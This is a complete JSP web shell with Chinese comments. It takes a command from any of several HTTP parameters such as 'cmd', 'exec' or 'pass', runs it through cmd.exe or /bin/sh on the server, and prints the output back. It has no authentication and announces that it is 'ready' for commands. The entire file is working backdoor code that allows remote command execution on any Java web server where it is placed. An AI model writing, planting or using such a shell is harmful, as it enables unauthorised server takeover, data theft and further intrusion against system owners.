<%@ page import="java.io.*,java.util.*" %>
<%
    // 定义所有可能的参数名
    String[] paramNames = {"cmd", "pass", "c", "code", "action", "exec", "command"};
    String execCmd = null;

    // 遍历查找哪个参数被使用
    for (String pName : paramNames) {
        String val = request.getParameter(pName);
        if (val != null && !val.isEmpty()) {
            execCmd = val;
            break;
        }
    }

    // 核心逻辑：如果有命令，进入纯输出模式
    if (execCmd != null) {
        // 设置为纯文本，防止脚本解析HTML出错
        response.setContentType("text/plain;charset=UTF-8");
        response.setCharacterEncoding("UTF-8");

        try {
            // 判断操作系统 (Windows or Linux)
            String os = System.getProperty("os.name").toLowerCase();
            ProcessBuilder pb;
            if (os.contains("win")) {
                pb = new ProcessBuilder(new String[]{"cmd.exe", "/c", execCmd});
            } else {
                pb = new ProcessBuilder(new String[]{"/bin/sh", "-c", execCmd});
            }

            Process p = pb.start();

            // 读取标准输出
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String s;
            while ((s = stdInput.readLine()) != null) {
                out.println(s);
            }

            // 读取错误输出 (如果命令输错了，能看报错)
            BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            while ((s = stdError.readLine()) != null) {
                out.println(s);
            }

        } catch (Exception e) {
            out.println("Error: " + e.getMessage());
        }

        // 执行完命令后，直接结束响应
        return;
    }

    
    
%>
<html><body>
<pre>JSP Shell is ready. Waiting for command...</pre>
</body></html>
